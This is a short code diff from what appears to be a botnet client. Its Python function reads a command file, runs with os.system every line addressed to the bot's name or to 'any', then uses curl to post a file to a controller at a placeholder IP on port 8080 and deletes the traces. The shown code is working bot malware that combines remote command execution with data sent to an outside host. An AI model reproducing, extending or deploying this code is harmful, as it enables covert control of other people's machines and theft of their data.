@@ -65,14 +65,16 @@ def instructions():
 	os.system('cat name.txt > sendthis.txt')
 	with open('response.txt') as input_file:
 		myname = open('name.txt', 'r').read()
-		command = ''
 		for line in input_file:
-			bot = line.split("'")[0]
-			if bot == myname or bot == 'any':
-				command += line.split("'")[1]
-		os.system(command)
-		os.system('curl -d @./sendthis.txt {IP}:8080/instructions.txt')
-		os.system('rm sendthis.txt response.txt')
+			commands = line.split()
+			mycommand = ''
+			if commands[0] == myname or commands [0] == 'any':
+				for thing in commands[1:]:
+					mycommand += thing
+					mycommand += ' '
+			os.system(mycommand)
+	os.system('curl -d @./sendthis.txt {IP}:8080/instructions.txt')
+	os.system('rm sendthis.txt response.txt')
 
 
 
